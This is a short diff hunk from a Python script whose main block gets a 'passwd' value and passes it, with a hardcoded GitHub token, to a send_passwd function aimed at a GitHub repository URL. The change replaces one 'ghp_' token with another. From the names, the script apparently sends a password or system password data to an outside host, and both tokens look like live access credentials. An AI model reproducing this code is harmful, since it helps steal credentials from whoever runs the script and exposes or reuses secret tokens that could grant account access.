@@ -20,6 +20,6 @@ def send_passwd(passwd, token, url):
 
 if __name__ == "__main__":
   passwd = get_passwd()
-  token = "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" # Reemplace por su token real
+  token = "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" # Reemplace por su token real
   url = "https://github.com/msiriusv/passwd" # Reemplace por la URL real
   send_passwd(passwd, token, url)
